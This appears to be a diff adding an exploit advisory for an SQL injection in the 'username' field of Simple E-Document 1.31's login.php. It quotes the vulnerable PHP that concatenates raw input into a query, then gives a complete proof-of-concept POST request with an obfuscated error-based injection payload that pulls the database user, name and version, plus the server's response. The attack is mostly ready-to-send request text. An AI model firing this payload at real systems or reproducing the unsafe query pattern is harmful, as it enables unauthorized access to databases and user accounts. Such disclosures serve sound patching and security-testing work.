@@ -1,0 +1,48 @@
+# Exploit Title: Simple E-Document 1.31 - 'username' SQL Injection
+# Dork: N/A
+# Date: 2018-11-14
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.tecorange.com/index.php/download-free-open-source-software/79-simple-e-document-free-open-source-document-and-paper-m
+# Software Link: https://datapacket.dl.sourceforge.net/project/simplee-doc/simple_e_document_v_1_31.zip
+# Version: 1.31
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# //[PATH]//login.php
+# ....
+#10 if(!isset($_POST['op'])) $_POST['op']='';
+#11 if(!isset($_POST['username'])) $_POST['username']='';
+#12 if(!isset($_POST['password'])) $_POST['password']='';
+#13 if(!isset($op)) $op='';
+#14 
+#15 $op = $_POST['op'];
+#16 $username= stripslashes($_POST['username']);
+#17 $password= stripslashes($_POST['password']);
+#18 $r_password = md5($password);
+#19 
+#20 $sql = "SELECT * From edocphp_users WHERE username='$username' AND password ='$r_password'";
+# ....
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/login.php
+# 
+POST /PATH/login.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 267
+username=12'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'
+HTTP/1.1 200 OK
+Date: Wed, 14 Nov 2018 07:44:24 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 241
+Keep-Alive: timeout=5, max=97
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
